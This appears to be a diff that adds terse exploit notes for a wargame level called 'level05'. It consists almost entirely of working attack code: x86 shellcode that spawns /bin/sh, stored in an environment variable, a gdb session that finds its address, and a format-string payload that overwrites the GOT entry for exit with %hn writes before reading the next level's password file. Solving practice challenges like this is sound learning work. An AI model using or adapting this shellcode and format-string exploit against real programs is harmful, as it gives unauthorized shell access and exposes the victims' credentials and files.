@@ -1,0 +1,21 @@
+export SHELLCODE=$(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
+
+exec env - SHELLCODE=$SHELLCODE gdb -ex 'unset env LINES' -ex 'unset env COLUMNS' --args ./level05
+
+(gdb) x/s *((char **) environ+1)
+0xffffdfbc:      "SHELLCODE=1\311\367\341Qh//shh/bin\211\343\260\v\315\200"
+
+bc + 10 = c6
+
+0xffffdfc6 -> beginning of shellcode
+
+ffff -> 65535
+dfc6 -> 57286
+
+got exit address     = 0x080497e0   10th
+                  +2 = 0x080497e2   11th
+																			57286-8     65535-57286
+{
+python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57278x%10$hn%8249x%11$hn"';
+echo "cd ../level06 && cat .pass";
+} | env - PWD=$PWD SHELLCODE=$SHELLCODE ~/level05
